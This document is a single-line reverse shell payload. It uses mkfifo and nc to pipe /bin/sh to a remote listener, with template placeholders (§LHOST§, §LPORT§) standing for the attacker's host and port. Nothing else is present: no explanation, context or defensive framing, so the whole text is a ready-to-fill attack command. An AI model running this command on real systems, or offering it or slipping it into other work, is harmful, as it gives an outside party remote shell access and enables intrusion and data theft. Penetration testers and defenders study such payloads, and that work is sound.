mkfifo /dev/shm/s;nc §LHOST§ §LPORT§ 0</dev/shm/s|/bin/sh|tee /dev/shm/s
